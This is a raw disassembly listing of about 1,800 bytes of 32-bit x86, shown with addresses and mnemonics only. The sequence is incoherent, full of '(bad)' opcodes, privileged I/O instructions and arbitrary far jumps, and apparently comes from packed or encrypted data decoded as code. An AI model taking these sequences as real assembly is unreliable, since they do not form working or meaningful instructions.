  41df49:	test   al,0x83
  41df4b:	pop    eax
  41df4c:	cmp    bl,al
  41df4e:	push   edx
  41df4f:	aas    
  41df50:	inc    edi
  41df51:	mov    ah,0x4f
  41df53:	popa   
  41df54:	icebp  
  41df55:	popf   
  41df56:	aaa    
  41df57:	cmc    
  41df58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df59:	xchg   edx,eax
  41df5a:	fisttp QWORD PTR [ecx+ecx*8-0x2a4d6365]
  41df61:	clc    
  41df62:	xchg   ebp,eax
  41df63:	mov    ebx,0x4ddae76
  41df68:	inc    esi
  41df69:	xchg   esp,eax
  41df6a:	ds mov bl,0xce
  41df6d:	jmp    0x7ec2:0x8c4
  41df73:	in     al,dx
  41df74:	dec    esi
  41df75:	out    dx,eax
  41df76:	fild   WORD PTR [edi]
  41df78:	dec    ecx
  41df79:	push   0xe348ab12
  41df7e:	xor    BYTE PTR [ebx-0x1e],al
  41df81:	or     al,0x1a
  41df83:	mov    fs,ebx
  41df85:	inc    edi
  41df86:	mov    eax,ds:0xda365255
  41df8b:	les    edx,FWORD PTR ds:0xb76e8cf4
  41df91:	outs   dx,BYTE PTR ds:[esi]
  41df92:	xlat   BYTE PTR es:[ebx]
  41df94:	sbb    al,0xe
  41df96:	jae    0x41df7d
  41df98:	pop    ebp
  41df99:	daa    
  41df9a:	xchg   ebx,eax
  41df9b:	stc    
  41df9c:	popa   
  41df9d:	(bad)  
  41df9e:	shl    DWORD PTR [esi+0x4c019495],cl
  41dfa4:	cs iret 
  41dfa6:	stc    
  41dfa7:	jg     0x41dfa8
  41dfa9:	ret    0x10db
  41dfac:	jne    0x41df66
  41dfae:	mov    bl,0xb8
  41dfb0:	call   0x866e6a1e
  41dfb5:	dec    eax
  41dfb6:	das    
  41dfb7:	mov    BYTE PTR [eax-0x1a2b3f8d],dl
  41dfbd:	jns    0x41df7d
  41dfbf:	(bad)  
  41dfc0:	mov    ah,0xd6
  41dfc2:	xchg   esi,eax
  41dfc3:	sbb    ebp,DWORD PTR [ebp+0x5780f3a8]
  41dfc9:	enter  0x30e8,0xc0
  41dfcd:	(bad)  
  41dfcf:	push   ss
  41dfd0:	lahf   
  41dfd1:	xchg   edx,eax
  41dfd2:	xchg   esi,eax
  41dfd3:	xchg   DWORD PTR [esi-0x24d5e7fc],edi
  41dfd9:	nop
  41dfda:	call   0x1787:0x8ce504d9
  41dfe1:	adc    al,0xbb
  41dfe3:	push   eax
  41dfe4:	cs je  0x41dfa2
  41dfe7:	stc    
  41dfe8:	dec    eax
  41dfe9:	inc    esi
  41dfea:	(bad)  
  41dfeb:	cmp    ch,BYTE PTR [edx]
  41dfed:	adc    al,0x9e
  41dfef:	jmp    0xf44d:0x8fe53fa7
  41dff6:	imul   ebx,DWORD PTR [ebp+0x15d84324],0xab4d9d20
  41e000:	xor    ch,0xe
  41e003:	test   esp,0x57b8d6cb
  41e009:	fstp   DWORD PTR [ebp+0xdadea95]
  41e00f:	mov    bl,0x2c
  41e011:	jmp    0x41e05e
  41e013:	lds    ecx,FWORD PTR [ebp-0x6f2e7384]
  41e019:	dec    ebp
  41e01a:	push   es
  41e01b:	cmp    BYTE PTR [eax+0x40ce9a9],ah
  41e021:	pop    esi
  41e022:	out    0xd4,al
  41e024:	sahf   
  41e025:	outs   dx,DWORD PTR ds:[esi]
  41e026:	(bad)  gs:[ecx+0x61a548d5]
  41e02d:	fs xchg edi,eax
  41e02f:	cmp    eax,0x3dc92ebf
  41e034:	in     al,0x8b
  41e036:	scas   eax,DWORD PTR es:[edi]
  41e037:	add    eax,0x58355cf4
  41e03c:	cmp    eax,0x240deb22
  41e041:	cmp    bh,BYTE PTR [edi-0x74]
  41e044:	sysexit 
  41e046:	aaa    
  41e047:	loope  0x41e019
  41e049:	(bad)  
  41e04a:	sbb    al,0xfa
  41e04c:	int    0x9
  41e04e:	sti    
  41e04f:	dec    ebp
  41e050:	lahf   
  41e051:	dec    ebx
  41e052:	in     eax,0xfb
  41e054:	ja     0x41e07e
  41e056:	scas   al,BYTE PTR es:[edi]
  41e057:	mov    ebp,es
  41e059:	or     eax,0x5d7cfe91
  41e05e:	mov    al,0x54
  41e060:	out    0x32,eax
  41e062:	inc    esp
  41e063:	xchg   ebx,eax
  41e064:	std    
  41e065:	xor    eax,0x21
  41e068:	cmp    eax,0x5b1f6e95
  41e06d:	jl     0x41e05e
  41e06f:	sub    ecx,DWORD PTR [ecx]
  41e071:	jecxz  0x41e0e4
  41e073:	iret   
  41e074:	mov    ebx,0xb14f0eb3
  41e079:	or     bl,BYTE PTR [ecx]
  41e07b:	sbb    al,0x5b
  41e07d:	ret    0x2737
  41e080:	mov    ds,WORD PTR [ebx+0x2a]
  41e083:	dec    esi
  41e084:	adc    al,0x73
  41e086:	cs mov ah,0x8c
  41e089:	dec    ah
  41e08b:	mov    esi,DWORD PTR [edx]
  41e08d:	scas   eax,DWORD PTR es:[edi]
  41e08e:	jmp    0xa7f67e7c
  41e093:	popf   
  41e094:	arpl   WORD PTR [esi],ax
  41e096:	jl     0x41e041
  41e098:	cli    
  41e099:	mov    fs,WORD PTR [edx-0x76]
  41e09c:	aas    
  41e09d:	mov    ecx,0x59832b5
  41e0a2:	repz or esi,DWORD PTR [esp+edx*2]
  41e0a6:	jp     0x41e029
  41e0a8:	in     eax,0x35
  41e0aa:	aad    0x67
  41e0ac:	fdivr  st,st(7)
  41e0ae:	leave  
  41e0af:	jmp    0xf30abce2
  41e0b4:	xchg   edx,eax
  41e0b5:	add    dh,bh
  41e0b7:	dec    edx
  41e0b8:	push   es
  41e0b9:	pop    ds
  41e0ba:	sub    ebp,DWORD PTR [edi-0xf327555]
  41e0c0:	int    0xb7
  41e0c2:	cmp    DWORD PTR [ebp-0x1a],esi
  41e0c5:	inc    esi
  41e0c6:	int    0xf5
  41e0c8:	sbb    BYTE PTR [ebx+0x48990ff2],bl
  41e0ce:	and    DWORD PTR [ebx-0x5],0xee3da000
  41e0d5:	fiadd  DWORD PTR [ebp-0x7bf46f38]
  41e0db:	sbb    ch,dl
  41e0dd:	xchg   esp,eax
  41e0de:	inc    esi
  41e0df:	div    BYTE PTR [ecx+0x3fa2a9e5]
  41e0e5:	jns    0x41e113
  41e0e7:	mov    edx,0xe20f68c1
  41e0ec:	add    edx,DWORD PTR [esi+0x52]
  41e0ef:	xchg   esp,eax
  41e0f0:	ficom  WORD PTR [eax+0x7e]
  41e0f3:	xchg   ebx,eax
  41e0f4:	pusha  
  41e0f5:	dec    ebx
  41e0f6:	jo     0x41e173
  41e0f8:	add    DWORD PTR [ebp-0x39],ebp
  41e0fb:	out    0x1b,al
  41e0fd:	add    ch,BYTE PTR [edx-0x2edeb939]
  41e103:	test   eax,0xe946b4df
  41e108:	ins    DWORD PTR es:[edi],dx
  41e109:	or     BYTE PTR [edi+0x75],al
  41e10c:	add    eax,0x62086e0a
  41e111:	sti    
  41e112:	xchg   eax,esi
  41e114:	cdq    
  41e115:	push   eax
  41e116:	js     0x41e12a
  41e118:	sub    DWORD PTR [ebx-0x4c021a65],eax
  41e11e:	adc    ebp,DWORD PTR es:[eax+0x63439a2b]
  41e125:	pop    edi
  41e126:	popf   
  41e127:	jnp    0x41e0eb
  41e129:	dec    ebx
  41e12a:	es pop ss
  41e12c:	lock xor ax,WORD PTR [edi+edi*4]
  41e131:	jne    0x41e105
  41e133:	lea    esp,[ecx]
  41e135:	jns    0x41e0f5
  41e137:	jecxz  0x41e0c3
  41e139:	mov    bh,0x7
  41e13b:	dec    eax
  41e13c:	push   0x14
  41e13e:	xor    ah,BYTE PTR [eax-0x11]
  41e141:	push   eax
  41e142:	or     al,0xe9
  41e144:	aas    
  41e145:	jmp    0xf3d6:0xe881ac4e
  41e14c:	jnp    0x41e1a0
  41e14e:	out    dx,eax
  41e14f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e151:	inc    ecx
  41e152:	das    
  41e153:	sbb    BYTE PTR [esi+0x46],bl
  41e156:	pushf  
  41e157:	xor    al,0xc0
  41e159:	not    cl
  41e15b:	gs int3 
  41e15d:	xor    DWORD PTR [esi-0x2a1f6155],ecx
  41e163:	into   
  41e164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e165:	rol    BYTE PTR [edi],1
  41e167:	dec    edx
  41e168:	xor    eax,0x90d6caf5
  41e16d:	imul   edi,ebp,0x14
  41e170:	jnp    0x41e102
  41e172:	push   cs
  41e173:	sbb    BYTE PTR [edi],bl
  41e175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e176:	mov    dl,0xd6
  41e178:	push   edi
  41e179:	test   al,0xec
  41e17b:	popa   
  41e17c:	cs inc edi
  41e17e:	mov    eax,0x276e70cf
  41e183:	xor    dl,dl
  41e185:	pop    esp
  41e186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e187:	jecxz  0x41e1c3
  41e189:	data16 (bad) 
  41e18b:	sbb    al,0xce
  41e18d:	popf   
  41e18e:	mov    ebp,0x663943db
  41e193:	inc    ebp
  41e194:	xor    ebp,ebx
  41e196:	hlt    
  41e197:	mov    eax,ds:0x547da262
  41e19c:	jb     0x41e192
  41e19e:	shr    esp,0xb2
  41e1a1:	fcmovnbe st,st(6)
  41e1a3:	xchg   ecx,eax
  41e1a4:	mov    bp,0x11f4
  41e1a8:	adc    BYTE PTR [eiz*8+0x7d635406],0xb1
  41e1b0:	push   es
  41e1b1:	cmp    al,0x48
  41e1b3:	push   cs
  41e1b4:	ror    DWORD PTR [esi+0x4d],cl
  41e1b7:	sbb    ebp,DWORD PTR [ebp-0x729d9d02]
  41e1bd:	and    BYTE PTR [eax-0x6a],bh
  41e1c0:	out    dx,eax
  41e1c1:	mov    BYTE PTR [edi-0xb99d248],bh
  41e1c7:	inc    esp
  41e1c8:	inc    eax
  41e1c9:	xchg   esi,eax
  41e1ca:	cmp    al,BYTE PTR [ebp-0x305e3236]
  41e1d0:	adc    dl,al
  41e1d2:	mov    eax,0xd1085f70
  41e1d7:	mov    dl,0x0
  41e1d9:	cmp    esp,ebp
  41e1db:	das    
  41e1dc:	mov    DWORD PTR ds:0x4fe87bd1,ebp
  41e1e2:	jp     0x41e1f6
  41e1e4:	xor    DWORD PTR [ebp+eiz*2-0x4ca24e16],edi
  41e1eb:	xchg   esi,eax
  41e1ec:	mov    ebp,DWORD PTR [ebx+0x5a]
  41e1ef:	leave  
  41e1f0:	xor    eax,0x9a79ce35
  41e1f5:	out    0xfa,al
  41e1f7:	cmp    BYTE PTR [edx-0x63961375],ch
  41e1fd:	xlat   BYTE PTR ds:[ebx]
  41e1fe:	ret    0x80b3
  41e201:	push   edx
  41e202:	fcomp  DWORD PTR [esi-0x36ed197e]
  41e208:	addr16 and al,0xa2
  41e20b:	int3   
  41e20c:	sbb    al,0xcd
  41e20e:	les    ebp,FWORD PTR [edi+0x7fe12175]
  41e214:	add    al,BYTE PTR ds:0x75db1102
  41e21a:	sahf   
  41e21b:	in     eax,0x86
  41e21d:	mov    fs,WORD PTR [ebx-0x64db66bb]
  41e223:	out    0xb2,al
  41e225:	push   edx
  41e226:	scas   al,BYTE PTR es:[edi]
  41e227:	out    dx,eax
  41e228:	scas   al,BYTE PTR es:[edi]
  41e229:	rcr    DWORD PTR [ebx+0x6a],cl
  41e22c:	jo     0x41e251
  41e22e:	rcr    cl,cl
  41e230:	test   DWORD PTR [eax],eax
  41e232:	lods   al,BYTE PTR ds:[esi]
  41e233:	mov    cl,0x42
  41e235:	ins    DWORD PTR es:[edi],dx
  41e236:	jae    0x41e258
  41e238:	(bad)  
  41e239:	(bad)  
  41e23a:	int    0xf1
  41e23c:	mov    al,0x57
  41e23e:	xchg   BYTE PTR [edi-0xe3fedcf],dl
  41e244:	mov    ds:0x378d534f,al
  41e249:	sbb    cl,dl
  41e24b:	or     cl,BYTE PTR [ecx-0x34]
  41e24e:	jp     0x41e1e8
  41e250:	sub    ch,BYTE PTR [ebx+ebx*1+0x2c327b14]
  41e257:	mov    ch,0xe7
  41e259:	jnp    0x41e2b1
  41e25b:	inc    eax
  41e25c:	jecxz  0x41e2c6
  41e25e:	das    
  41e25f:	hlt    
  41e260:	mov    eax,0x2f94d84f
  41e265:	sar    BYTE PTR [ebp-0x39],1
  41e268:	xchg   DWORD PTR [ecx-0x78],esp
  41e26b:	jge    0x41e248
  41e26d:	cld    
  41e26e:	xlat   BYTE PTR ds:[ebx]
  41e26f:	cmc    
  41e270:	fnstsw WORD PTR [ecx]
  41e272:	sbb    esp,DWORD PTR [edx]
  41e274:	pop    edi
  41e275:	jl     0x41e2a7
  41e277:	hlt    
  41e278:	jnp    0x41e2db
  41e27a:	mov    ds:0x89090610,eax
  41e27f:	inc    eax
  41e280:	addr16 or al,0x8a
  41e283:	call   0x760e:0xf9ef8672
  41e28a:	mov    al,0x24
  41e28c:	fdivr  DWORD PTR [ecx+ebp*4+0x4e]
  41e290:	lock jno 0x41e280
  41e293:	jo     0x41e22d
  41e295:	inc    edx
  41e296:	xchg   ecx,eax
  41e297:	adc    al,0xad
  41e299:	or     bh,0xd2
  41e29c:	ja     0x41e225
  41e29e:	mov    dh,0xcd
  41e2a0:	dec    ebx
  41e2a1:	gs clc 
  41e2a3:	iret   
  41e2a4:	mov    ch,0xd6
  41e2a6:	mov    ecx,0x4afe4a5
  41e2ab:	cli    
  41e2ac:	fs inc ebx
  41e2ae:	push   edx
  41e2af:	lods   eax,DWORD PTR ds:[esi]
  41e2b0:	push   ss
  41e2b1:	test   al,0x3a
  41e2b3:	or     BYTE PTR [eax],bl
  41e2b5:	aaa    
  41e2b6:	jmp    0x41e2f1
  41e2b8:	push   ebx
  41e2b9:	call   0x68fa1ece
  41e2be:	and    al,0x77
  41e2c0:	std    
  41e2c1:	inc    ecx
  41e2c2:	jnp    0x41e33a
  41e2c4:	test   BYTE PTR [edx+eiz*8-0x70],ch
  41e2c8:	mov    ds:0xe0fac604,al
  41e2cd:	cmp    esi,0xffffff9d
  41e2d0:	inc    ebp
  41e2d1:	mov    BYTE PTR [eax-0x119a212],dl
  41e2d7:	rcr    DWORD PTR [eax],cl
  41e2d9:	xchg   edi,eax
  41e2da:	call   0x9ff58007
  41e2df:	xchg   esp,eax
  41e2e0:	out    dx,al
  41e2e1:	lock ins BYTE PTR es:[edi],dx
  41e2e3:	ret    0x359c
  41e2e6:	dec    esp
  41e2e7:	push   edi
  41e2e8:	adc    ebx,DWORD PTR [ebx]
  41e2ea:	inc    esi
  41e2eb:	arpl   bp,bp
  41e2ed:	mov    al,0x9b
  41e2ef:	mov    ?,WORD PTR [edx+0x50]
  41e2f2:	xchg   ebx,eax
  41e2f3:	sub    esp,DWORD PTR [ebp-0x24f3a1fd]
  41e2f9:	cmp    ah,BYTE PTR [ebp+0x7764ec47]
  41e2ff:	push   edi
  41e300:	push   cs
  41e301:	and    edi,DWORD PTR [edx-0x31]
  41e304:	in     eax,dx
  41e305:	pusha  
  41e306:	(bad)  
  41e307:	imul   esp,DWORD PTR [ecx-0x51],0xd
  41e30b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e30c:	sbb    BYTE PTR ds:0x3301ecd8,cl
  41e312:	ret    0x1a45
  41e315:	fisub  DWORD PTR [esi]
  41e317:	mul    DWORD PTR [esp+ebx*2]
  41e31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e31b:	arpl   bp,cx
  41e31d:	sub    esp,DWORD PTR [ecx-0x3a05f8cc]
  41e323:	and    cl,BYTE PTR [edi-0x25]
  41e326:	hlt    
  41e327:	adc    esi,ebp
  41e329:	push   0x152dd71d
  41e32e:	inc    ebx
  41e32f:	xor    ch,BYTE PTR [ebp+0x28c85fd]
  41e335:	iret   
  41e336:	xchg   DWORD PTR [ebx-0x10],edx
  41e339:	push   cs
  41e33a:	mov    edx,0x1f5a485d
  41e33f:	ins    BYTE PTR es:[edi],dx
  41e340:	sar    DWORD PTR [eax],cl
  41e342:	retf   0xa8b9
  41e345:	pop    edi
  41e346:	fistp  QWORD PTR [esi-0x70]
  41e349:	ffree  st(7)
  41e34b:	iret   
  41e34c:	mov    bh,0x58
  41e34e:	xchg   esp,eax
  41e34f:	in     al,dx
  41e350:	fisubr WORD PTR [edx]
  41e352:	pop    ebx
  41e353:	nop
  41e354:	std    
  41e355:	cmp    cl,dl
  41e357:	loope  0x41e327
  41e359:	shl    DWORD PTR [edx],cl
  41e35b:	sub    edx,edi
  41e35d:	call   0x5de684d8
  41e362:	sbb    edx,ecx
  41e364:	or     cl,ch
  41e366:	push   esi
  41e367:	xchg   esi,eax
  41e368:	test   DWORD PTR [ebp-0x502e697a],esi
  41e36e:	or     al,0xda
  41e370:	mov    DWORD PTR [edx+0x5b7a2cac],edx
  41e376:	adc    eax,0x6a339855
  41e37b:	icebp  
  41e37c:	adc    esi,ebx
  41e37e:	jo     0x41e3ba
  41e380:	arpl   WORD PTR ds:0x2a5e32f4,bp
  41e386:	mov    DWORD PTR [ebx+0x4a],eax
  41e389:	pop    edi
  41e38a:	pop    edi
  41e38b:	ret    
  41e38c:	sub    eax,0x6d485e32
  41e391:	outs   dx,DWORD PTR ds:[esi]
  41e392:	popf   
  41e393:	xchg   ecx,eax
  41e394:	rcr    BYTE PTR [edi-0x61],1
  41e397:	pop    ebx
  41e398:	test   DWORD PTR [ebx+0x16b35749],edi
  41e39e:	(bad)  
  41e39f:	mov    al,0x80
  41e3a1:	pop    edi
  41e3a2:	sub    BYTE PTR [ebx+0x5134efbb],al
  41e3a8:	sbb    eax,0x1c55b86e
  41e3ad:	mov    BYTE PTR [eax],0xfc
  41e3b0:	mov    ds,edx
  41e3b2:	pop    ebx
  41e3b3:	pop    ds
  41e3b4:	jg     0x41e383
  41e3b6:	lods   eax,DWORD PTR ds:[esi]
  41e3b7:	lahf   
  41e3b8:	aas    
  41e3b9:	ret    0x624d
  41e3bc:	rcl    ah,0xfb
  41e3bf:	ret    
  41e3c0:	sub    BYTE PTR [edi],0x2c
  41e3c3:	aam    0x73
  41e3c5:	mov    ebx,0xb7d117f
  41e3ca:	shr    DWORD PTR [ecx+ebp*2],0x22
  41e3ce:	push   ebx
  41e3cf:	retf   
  41e3d0:	enter  0x1548,0x3c
  41e3d4:	ja     0x41e359
  41e3d6:	scas   al,BYTE PTR es:[edi]
  41e3d7:	xor    BYTE PTR [edx+0xa],bh
  41e3da:	mov    al,ds:0x6a8af4c9
  41e3df:	es adc al,0xd4
  41e3e2:	jbe    0x41e433
  41e3e4:	and    dl,BYTE PTR [edx+0x3e4cfbe5]
  41e3ea:	dec    ebp
  41e3eb:	push   ecx
  41e3ec:	inc    BYTE PTR [edi-0x713c6ab5]
  41e3f2:	sbb    ah,ah
  41e3f4:	ins    BYTE PTR es:[edi],dx
  41e3f5:	sti    
  41e3f6:	adc    eax,0xde0a589a
  41e3fb:	dec    esp
  41e3fc:	shr    BYTE PTR [ebx-0x21],cl
  41e3ff:	dec    edi
  41e400:	add    DWORD PTR [edx-0x27011da2],esi
  41e406:	sub    DWORD PTR [eax-0x3247e91b],0xffffffbe
  41e40d:	or     al,0xef
  41e40f:	dec    esp
  41e410:	sbb    ch,al
  41e412:	pop    ebp
  41e413:	loop   0x41e47f
  41e415:	test   al,0x66
  41e417:	dec    eax
  41e418:	inc    eax
  41e419:	mov    dl,0xe9
  41e41b:	addr16 or edx,0xffffff9a
  41e41f:	sbb    DWORD PTR [esi-0x65],edi
  41e422:	(bad)  
  41e423:	cs test al,0x63
  41e426:	mov    ch,0x33
  41e428:	adc    DWORD PTR [ebp+0x3afb69d4],0xc21113da
  41e432:	mov    al,ds:0x6cfce66b
  41e437:	pop    ebx
  41e438:	or     eax,ebp
  41e43a:	add    DWORD PTR [eax+0x79],0x2a
  41e43e:	dec    ebx
  41e43f:	stc    
  41e440:	dec    ebp
  41e441:	cmp    BYTE PTR [edi+0x35a0809d],dl
  41e447:	dec    eax
  41e448:	ret    
  41e449:	dec    esi
  41e44a:	aas    
  41e44b:	bound  eax,QWORD PTR [ecx-0x662281a1]
  41e451:	fstp   TBYTE PTR [eax]
  41e453:	jns    0x41e4ab
  41e455:	push   esp
  41e456:	xor    DWORD PTR [edx-0x6e6c6159],edx
  41e45c:	icebp  
  41e45d:	test   DWORD PTR [ecx],0x2513f1c7
  41e463:	jl     0x41e4ba
  41e465:	mov    al,BYTE PTR [ebx]
  41e467:	xor    al,0xa2
  41e469:	xchg   ebx,eax
  41e46a:	jne    0x41e404
  41e46c:	pop    ecx
  41e46d:	popf   
  41e46e:	adc    ebx,edi
  41e470:	loop   0x41e454
  41e472:	mov    ch,0x6f
  41e474:	pop    es
  41e475:	ins    BYTE PTR es:[edi],dx
  41e476:	fild   QWORD PTR [eax+eiz*1]
  41e479:	shl    esi,cl
  41e47b:	cmp    BYTE PTR [esi],0x3f
  41e47e:	jnp    0x41e46c
  41e480:	aad    0xbc
  41e482:	push   ebx
  41e483:	inc    ecx
  41e484:	inc    ebp
  41e485:	mov    edx,0xcc4c3ebc
  41e48a:	loopne 0x41e4a0
  41e48c:	in     eax,dx
  41e48d:	loope  0x41e429
  41e48f:	in     al,dx
  41e490:	pop    ss
  41e491:	xchg   edx,eax
  41e492:	add    eax,0xd7e141b7
  41e497:	ja     0x41e4bb
  41e499:	jmp    0x41e51a
  41e49b:	test   eax,0x17b67979
  41e4a0:	adc    BYTE PTR [esi],cl
  41e4a2:	mov    ah,0x64
  41e4a4:	lahf   
  41e4a5:	stc    
  41e4a6:	stc    
  41e4a7:	mov    dh,0x5
  41e4a9:	dec    ebx
  41e4aa:	xor    eax,esi
  41e4ac:	cmovs  esi,DWORD PTR [ebx+0x7753ca7d]
  41e4b3:	mov    ch,0xc5
  41e4b5:	jecxz  0x41e4a2
  41e4b7:	(bad)  
  41e4b8:	cs mov dl,0xc5
  41e4bb:	sbb    eax,0xce917459
  41e4c0:	aaa    
  41e4c1:	cs xor al,0x13
  41e4c4:	xchg   edx,eax
  41e4c5:	inc    ebp
  41e4c6:	sbb    edx,DWORD PTR [edx*1+0x86e1dd8]
  41e4cd:	cs fmulp st(6),st
  41e4d0:	mov    WORD PTR [ebp-0x4e70752c],ds
  41e4d6:	pop    esp
  41e4d7:	inc    ebx
  41e4d8:	sbb    al,0x86
  41e4da:	cli    
  41e4db:	lds    ebx,FWORD PTR [bp+0x662f]
  41e4e0:	lds    ebx,FWORD PTR [edi]
  41e4e2:	cmp    eax,0xa9232a9b
  41e4e7:	sbb    ebx,DWORD PTR [esp+ebx*1-0x336fff45]
  41e4ee:	int    0x1d
  41e4f0:	sbb    al,0x47
  41e4f2:	(bad)  
  41e4f3:	cld    
  41e4f4:	dec    esp
  41e4f5:	xor    al,0x72
  41e4f7:	mov    esp,0xa2a25f5c
  41e4fc:	sbb    eax,0xb62f74fc
  41e501:	xor    ebp,DWORD PTR gs:[ecx+0x208ece45]
  41e508:	or     edi,esp
  41e50a:	(bad)  
  41e50b:	or     eax,DWORD PTR [esi+0x123baf2b]
  41e511:	sub    bl,ah
  41e513:	jne    0x41e4b3
  41e515:	jp     0x41e4ae
  41e517:	sbb    ecx,DWORD PTR [edi+0x3dde0632]
  41e51d:	push   ecx
  41e51e:	es jbe 0x41e51a
  41e521:	lock loop 0x41e540
  41e524:	dec    ebp
  41e525:	jecxz  0x41e508
  41e527:	icebp  
  41e528:	dec    ebp
  41e529:	mov    edi,0x92c7b9fb
  41e52e:	inc    ecx
  41e52f:	cmp    bl,BYTE PTR [ebp+0x4d]
  41e532:	push   ecx
  41e533:	sub    dh,BYTE PTR [edx-0x8a146a3]
  41e539:	(bad)  
  41e53a:	mov    ebp,0xeac68b99
  41e53f:	push   esi
  41e540:	jecxz  0x41e58c
  41e542:	xor    al,0x36
  41e544:	fisub  DWORD PTR [ebp+eax*2-0x38a6d4ee]
  41e54b:	stos   DWORD PTR es:[edi],eax
  41e54c:	mov    bl,0xdc
  41e54e:	retf   0x6ee5
  41e551:	shr    BYTE PTR [edi-0xc9d6ddc],0xe3
  41e558:	or     ebx,DWORD PTR [ecx+0x777f18c1]
  41e55e:	or     al,0xe9
  41e560:	add    al,dl
  41e562:	aaa    
  41e563:	scas   al,BYTE PTR es:[edi]
  41e564:	xchg   edi,eax
  41e565:	jbe    0x41e555
  41e567:	jb     0x41e557
  41e569:	into   
  41e56a:	aaa    
  41e56b:	sti    
  41e56c:	jnp    0x41e557
  41e56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e56f:	cmovns eax,DWORD PTR [ecx-0x6da8253c]
  41e576:	push   eax
  41e577:	stos   BYTE PTR es:[edi],al
  41e578:	jg     0x41e544
  41e57a:	add    BYTE PTR [edx],0x77
  41e57d:	icebp  
  41e57e:	push   es
  41e57f:	push   cs
  41e580:	xor    esp,ebx
  41e582:	into   
  41e583:	dec    edx
  41e584:	xchg   ebx,eax
  41e585:	xchg   esp,eax
  41e586:	ins    DWORD PTR es:[edi],dx
  41e587:	and    eax,0x686e83be
  41e58c:	out    0xe6,eax
  41e58e:	pop    eax
  41e58f:	outs   dx,DWORD PTR ds:[esi]
  41e590:	xchg   DWORD PTR [ebx-0x15642cbb],eax
  41e596:	fldenv [edx]
  41e598:	jo     0x41e5f3
  41e59a:	sub    al,0x70
  41e59c:	mov    bl,0x39
  41e59e:	fisubr DWORD PTR [esi+edi*2-0x20b57d1]
  41e5a5:	imul   eax,edx,0xffffff88
  41e5a8:	pop    ds
  41e5a9:	aas    
  41e5aa:	adc    ebp,DWORD PTR [edi]
  41e5ac:	out    dx,eax
  41e5ad:	add    al,0x75
  41e5af:	xor    BYTE PTR [esi+0x20d7a1f4],dl
  41e5b5:	pop    edi
  41e5b6:	push   edx
  41e5b7:	jl     0x41e5ef
  41e5b9:	iret   
  41e5ba:	xchg   ebx,eax
  41e5bb:	cs ss inc eax
  41e5be:	lea    edx,ds:[esp+edx*8-0x72]
  41e5c3:	pop    ss
  41e5c4:	ins    DWORD PTR es:[edi],dx
  41e5c5:	cmp    ebx,esp
  41e5c7:	jge    0x41e5a5
  41e5c9:	nop
  41e5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5cb:	push   0xffffffdd
  41e5cd:	mov    al,0xa6
  41e5cf:	retf   0x4d3a
  41e5d2:	mov    cl,0x34
  41e5d4:	push   ecx
  41e5d5:	xor    esp,eax
  41e5d7:	ds jmp 0x41e645
  41e5da:	mov    dl,0xf1
  41e5dc:	clc    
  41e5dd:	xor    edi,edx
  41e5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e0:	loop   0x41e62b
  41e5e2:	dec    ecx
  41e5e3:	ret    0x823
  41e5e6:	mov    esp,DWORD PTR ds:0x7df4acf1
  41e5ec:	(bad)
  41e5f0:	jmp    0xec5:0xea116b95
  41e5f7:	rcl    BYTE PTR [eax-0x11],1
  41e5fa:	mov    DWORD PTR [esi+0x3a],edi
  41e5fd:	into   
  41e5fe:	adc    BYTE PTR [edi],dh
  41e600:	inc    ebx
  41e601:	lods   eax,DWORD PTR ds:[esi]
  41e602:	mov    ah,0xf3
  41e604:	call   0x1a1ed5ee
  41e609:	xor    al,0xe0
  41e60b:	jg     0x41e656
  41e60d:	jge    0x41e5db
  41e60f:	fisttp QWORD PTR [esi]
  41e611:	ret    0x9606
  41e614:	pop    es
  41e615:	test   edx,esi
  41e617:	cdq    
  41e618:	cmp    al,0x5
  41e61a:	sbb    BYTE PTR [ecx+0x77],dh
  41e61d:	popa   
  41e61e:	lea    esp,[ecx-0x43]
  41e621:	mov    ecx,0x174882a
  41e626:	fs sahf 
  41e628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e629:	push   ds
  41e62a:	dec    ecx
  41e62b:	push   eax
  41e62c:	push   eax
  41e62d:	sub    eax,0xc502769d
  41e632:	cmp    DWORD PTR [edx],esi
  41e634:	mov    WORD PTR [esp+eax*1],?
  41e637:	test   dh,cl
  41e639:	test   BYTE PTR [ebp+0x13],ch
  41e63c:	add    BYTE PTR [eax-0x563dbf3e],0x90
  41e643:	idiv   dh
  41e645:	mov    al,ds:0x3fb72861
  41e64a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e64b:	es ret 0x6721
  41e64f:	aam    0x36
  41e651:	jo     0x41e60a
  41e653:	les    ebx,FWORD PTR [edx]
  41e655:	jns    0x41e6c3
  41e657:	in     al,0x8f
  41e659:	pop    ds
  41e65a:	int3   
  41e65b:	push   esi
  41e65c:	fiadd  DWORD PTR ds:0x814bf90a
  41e662:	push   ebp
  41e663:	pop    edi
  41e664:	pop    es
  41e665:	fcom   QWORD PTR [ecx+0x3c4ec177]
  41e66b:	jl     0x41e688
  41e66d:	add    edi,esp
  41e66f:	xchg   ecx,eax
  41e670:	in     eax,0x67
  41e672:	mov    bh,0x68
  41e674:	jb     0x41e642
  41e676:	cmp    ch,BYTE PTR [eax-0x56695187]
  41e67c:	and    esp,0x11
  41e67f:	xchg   esp,eax
  41e680:	adc    BYTE PTR [eax],ch
  41e682:	push   0xffffffc8
  41e684:	or     DWORD PTR [ebx-0x58],esi
  41e687:	sahf   
  41e688:	stc    
  41e689:	jl     0x41e6e5
  41e68b:	in     eax,0x16
  41e68d:	lock popa 
  41e68f:	or     DWORD PTR [eax-0x3d1f8f42],ecx
  41e695:	into   
  41e696:	hlt    
  41e697:	loope  0x41e706
  41e699:	bound  ecx,QWORD PTR [ebx]
  41e69b:	push   ebp
  41e69c:	aad    0xf8
  41e69e:	lods   al,BYTE PTR ds:[esi]
  41e69f:	inc    eax
  41e6a0:	call   0xa258:0x2e0cf838
  41e6a7:	push   ecx
  41e6a8:	ss pop ebp
  41e6aa:	inc    esi
